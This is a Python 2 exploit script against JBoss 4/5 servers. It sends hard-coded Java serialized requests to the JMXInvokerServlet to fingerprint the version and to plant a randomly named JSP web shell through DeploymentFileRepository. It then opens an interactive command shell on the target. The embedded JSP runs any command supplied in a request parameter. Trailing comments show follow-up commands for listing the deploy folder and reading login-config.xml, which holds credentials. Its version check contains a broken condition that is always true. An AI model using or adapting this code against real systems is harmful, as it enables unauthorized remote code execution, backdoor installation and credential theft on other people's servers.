import requests
import base64
import random
import string
import jshell
import sys
import pdb

class jboss_exploit:
	def r_name(self,length=14, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
		result = ""
		for _ in range(length):
			result += random.choice(chars)
		return result
		
	def __init__(self,host,port,exploit):
		self.appbase = self.r_name()
		self.jspname = self.r_name()
		self.cmd_par = self.r_name(4)
		# Host details
		self.thost = host

		# Fill
		self.padding = "A" * 810 # Search for
		proto = ""
		
		print "Port %d"%(port)
		# Target url
		if(port == 80):
			proto = "http"
		elif(port == 443):
			proto = "https"
			
		self.target_url = proto + '://' + self.thost + ":" + str(port) + '/invoker/JMXInvokerServlet'

		# Headers to send with every serialized request
		self.headers = {'Content-Type':'application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation','Accept':'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2'}

		# War-details
		
		self.uri = ''
		self.data =''
		self.war_uri = '/' + self.appbase + '/' + self.jspname + '.jsp'
		# Serialized requests #
		# Get version
		self.version2 = '\xac\xed\x00\x05sr\x00)org.jboss.invocation.MarshalledInvocation\xf6\x06\x95\'A>\xa4\xbe\x0c\x00\x00xppw\x08\x97QM\xdd\xd4*B\xafsr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp&\x95\xbe\nsr\x00$org.jboss.invocation.MarshalledValue\xea\xcc\xe0\xd1\xf4J\xd0\x99\x0c\x00\x00xpw\x86\x00\x00\x00~\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x02sr\x00\x1bjavax.management.ObjectName\x0f\x03\xa7\x1b\xebm\x15\xcf\x03\x00\x00xpt\x00\x18jboss.system:type=Serverxt\x00\x07Version{\x87\xa0\xfbxw\x04\x00\x00\x00\x01sr\x00"org.jboss.invocation.InvocationKey\xb8\xfbr\x84\xd7\x93\x85\xf9\x02\x00\x01I\x00\x07ordinalxp\x00\x00\x00\x05sq\x00~\x00\x05w\r\x00\x00\x00\x05\xac\xed\x00\x05p\xfbW\xa7\xaaxw\x04\x00\x00\x00\x02sq\x00~\x00\x07\x00\x00\x00\x04sr\x00#org.jboss.invocation.InvocationTypeY\xa7:\x1c\xa5+|\xbf\x02\x00\x01I\x00\x07ordinalxp\x00\x00\x00\x01sq\x00~\x00\x07\x00\x00\x00\npx'
		# Deploy war
		self.install = '\xac\xed\x00\x05sr\x00)org.jboss.invocation.MarshalledInvocation\xf6\x06\x95\'A>\xa4\xbe\x0c\x00\x00xppw\x08x\x94\x98G\xc1\xd0S\x87sr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp&\x95\xbe\nsr\x00$org.jboss.invocation.MarshalledValue\xea\xcc\xe0\xd1\xf4J\xd0\x99\x0c\x00\x00xpz\x00\x00\x04\x00\x00\x00\x04\x9d\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x04sr\x00\x1bjavax.management.ObjectName\x0f\x03\xa7\x1b\xebm\x15\xcf\x03\x00\x00xpt\x00,jboss.admin:service=DeploymentFileRepositoryxt\x00\x05storeuq\x00~\x00\x00\x00\x00\x00\x05t\x00\x12regex_app_base.wart\x00\x0eregex_jsp_namet\x00\x04.jspt\xsr\x00\x11javaw\xa5.lang.Boolean\xcd r\x80\xd5\x9c\xfa\xee\x02\x00\x01Z\x00\x05valuexp\x00ur\x00\x13[Ljava.lang.String;\xad\xd2V\xe7\xe9\x1d{G\x02\x00\x00xp\x00\x00\x00\x05t\x00\x10java.lang.Stringt\x00\x10java.lang.Stringt\x00\x10java.lang.Stringt\x00\x10java.lang.Stringt\x00\x07boolean\x95*U\xc4xw\x04\x00\x00\x00\x01sr\x00"org.jboss.invocation.InvocationKey\xb8\xfbr\x84\xd7\x93\x85\xf9\x02\x00\x01I\x00\x07ordinalxp\x00\x00\x00\x05sq\x00~\x00\x05w\r\x00\x00\x00\x05\xac\xed\x00\x05p\xfbW\xa7\xaaxw\x04\x00\x00\x00\x03t\x00\x0fJMX_OBJECT_NAMEsr\x00\x1bjavax.management.ObjectName\x0f\x03\xa7\x1b\xebm\x15\xcf\x03\x00\x00xpt\x00,jboss.admin:service=DeploymentFileRepositoryxsq\x00~\x00\x07\x00\x00\x00\x04sr\x00#org.jboss.invocation.InvocationTypeY\xa7:\x1c\xa5+|\xbf\x02\x00\x01I\x00\x07ordinalxp\x00\x00\x00\x01sq\x00~\x00\x07\x00\x00\x00\npx'
		#For obfuscation, base64-body is an option
		#headers = {'Content-Type':'application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation','Accept':'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2','Content-Transfer-Encoding': 'base64'}
		#res = requests.post(exploit_url,data=base64.b64decode(version), headers=headers)
		#version = ("rO0ABXNyAClvcmcuamJvc3MuaW52b2NhdGlvbi5NYXJzaGFsbGVkSW52b2NhdGlvbvYGlSdBPqS+DAAAeHBwdwiXUU3d1CpCr3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAmlb4Kc3IAJG9yZy5qYm9zcy5pbnZvY2F0aW9uLk1hcnNoYWxsZWRWYWx1ZerM4NH0StCZDAAAeHB3hgAAAH6s7QAFdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdAAYamJvc3Muc3lzdGVtOnR5cGU9U2VydmVyeHQAB1ZlcnNpb257h6D7eHcEAAAAAXNyACJvcmcuamJvc3MuaW52b2NhdGlvbi5JbnZvY2F0aW9uS2V5uPtyhNeThfkCAAFJAAdvcmRpbmFseHAAAAAFc3EAfgAFdw0AAAAFrO0ABXD7V6eqeHcEAAAAAnNxAH4ABwAAAARzcgAjb3JnLmpib3NzLmludm9jYXRpb24uSW52b2NhdGlvblR5cGVZpzocpSt8vwIAAUkAB29yZGluYWx4cAAAAAFzcQB+AAcAAAAKcHg=")
		#install = ("rO0ABXNyAClvcmcuamJvc3MuaW52b2NhdGlvbi5NYXJzaGFsbGVkSW52b2NhdGlvbvYGlSdBPqS+DAAAeHBwdwh4lJhHwdBTh3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAmlb4Kc3IAJG9yZy5qYm9zcy5pbnZvY2F0aW9uLk1hcnNoYWxsZWRWYWx1ZerM4NH0StCZDAAAeHB6AAAEAAAABJ2s7QAFdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAABHNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdAAsamJvc3MuYWRtaW46c2VydmljZT1EZXBsb3ltZW50RmlsZVJlcG9zaXRvcnl4dAAFc3RvcmV1cQB+AAAAAAAFdAAScmVnZXhfYXBwX2Jhc2Uud2FydAAOcmVnZXhfanNwX25hbWV0AAQuanNwdAMqc3IAEWphdmF3pS5sYW5nLkJvb2xlYW7NIHKA1Zz67gIAAVoABXZhbHVleHAAdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAABXQAEGphdmEubGFuZy5TdHJpbmd0ABBqYXZhLmxhbmcuU3RyaW5ndAAQamF2YS5sYW5nLlN0cmluZ3QAEGphdmEubGFuZy5TdHJpbmd0AAdib29sZWFulSpVxHh3BAAAAAFzcgAib3JnLmpib3NzLmludm9jYXRpb24uSW52b2NhdGlvbktlebj7coTXk4X5AgABSQAHb3JkaW5hbHhwAAAABXNxAH4ABXcNAAAABaztAAVw+1enqnh3BAAAAAN0AA9KTVhfT0JKRUNUX05BTUVzcgAbamF2YXgubWFuYWdlbWVudC5PYmplY3ROYW1lDwOnG+ttFc8DAAB4cHQALGpib3NzLmFkbWluOnNlcnZpY2U9RGVwbG95bWVudEZpbGVSZXBvc2l0b3J5eHNxAH4ABwAAAARzcgAjb3JnLmpib3NzLmludm9jYXRpb24uSW52b2NhdGlvblR5cGVZpzocpSt8vwIAAUkAB29yZGluYWx4cAAAAAFzcQB+AAcAAAAKcHg=")
		# backdoors
		self.backdoor = """
		<%@page import="java.io.*,
				java.util.*,
				java.net.*,
				sun.misc.BASE64Decoder"
		%>

		<%
			String jboss_home = System.getProperty("jboss.server.home.dir");
			String os_name = System.getProperty("os.name");
			out.println(jboss_home + "<br />");
			out.println(os_name + "<br />");
		%>
		"""

		self.backdoor2 = """
		<%@ page import="java.util.*,java.io.*"%>
		<%
			
		    if (request.getParameter("c") != null) {
				String enc = request.getParameter("c");
		        Process p = Runtime.getRuntime().exec(enc);
		        OutputStream os = p.getOutputStream();
		        InputStream in = p.getInputStream();
		        DataInputStream dis = new DataInputStream(in);
		        String ln = dis.readLine();
		        while ( ln != null ) {
		            out.println(ln);
		            ln = dis.readLine();
		        }
		    }

		%>
		"""

	# self.appbase and self.jspname must be 14 bytes (serialized request in install)
	def marshall(self):
		#self.backdoor2 = self.backdoor2.replace("cmd",self.cmd_par)
		
		print "Backdoor2-length: " + str(len(self.backdoor2))
		# Check length of stage-script
		print "Length of stage-script before padding: " + str(len(self.backdoor2))
		
		# Calculate how much space we need to append to reach 810 bytes in the serialized request
		self.spaces = " " * (810 - len(self.backdoor2))
		# Append spaces
		self.backdoor2 += self.spaces
		
		# Perform a check
		if(len(self.backdoor2) > 810):
			print "Oops, backdoor length is more than 810 bytes, could mean serialization-problems "
			exit(0)

		print "Length of backdoor-script after padding: " + str(len(self.backdoor2))

		# Print Length of install for consistancy-check
		print "Length of install before replaces: " + str(len(self.install))

		# Replace app_base
		self.install = self.install.replace("regex_app_base",self.appbase)

		# Replace jsp_name
		self.install = self.install.replace("regex_jsp_name",self.jspname)
		
		

		# Inject the payload into the serialized request in install. Have to keep to 810 bytes in size
		print "Length of install before injection: " + str(len(self.install))
		self.install = self.install.replace(self.padding, self.backdoor2)
		print "Length of install after injection: " + str(len(self.install))
		
		if exploit == True:
			# INSTALL
			res = requests.post(self.target_url,self.install,headers=self.headers,verify=False)
			print res.text
	
	def info(self):
		print "Appbase: " + self.appbase
		print "JSP-name: " + self.jspname
		
		# Print the uri
		return self.target_url[:self.target_url.index("/invoker/JMXInvokerServlet")] + "/%s/%s.jsp"%(self.appbase,self.jspname)
	
	#Check if vulnerable
	def check(self):
		if("JBoss_4" or "JBoss_5" or "Branch_4" in build):
			print "[-] Version is vulnerable."
			return True
		else:
			print "[-] Version doesn't appear to be vulnerable"
			return False
	def version(self):
		print "[+] Getting version.."
		res = requests.post(self.target_url,self.version2,headers=self.headers,verify=False)
		if(res.status_code == 200):
			build = res.text[res.text.find("(build:"):res.text.find(")")]
			return build
		else:
			print "!! Hmm.. couldn't get version.. something went wrong - server did not return status code 200.\nQuitting.. !!"
			exit(0)
def main():
	if len(sys.argv) == 3:
		e = jboss_exploit(sys.argv[1],int(sys.argv[2]),True)
		j = jshell.jshell()
		version = e.version()
		print "[+] Version info: " + version
		print e.info()
		if(e.check() == True):
			# Deploying the shell may take some time, trying for ntries
			ntries = 5
		
			print "[+] Executing exploit"
			e.marshall()
			print "[+] Getting a shell, e.info: %s"%(e.info())
			j.start(e.info(),ntries)
	else:
		print "%s [host] [port]" % (sys.argv[0])
		exit(0)
	#


if __name__ == "__main__":
	main()

# c:\windows\system32\cmd.exe /c dir G:\jboss-5.1.0.GA\server\default\deploy\management\
# c:\windows\system32\cmd.exe /c type G:\jboss-5.1.0.GA\server\default\conf\login-config.xml


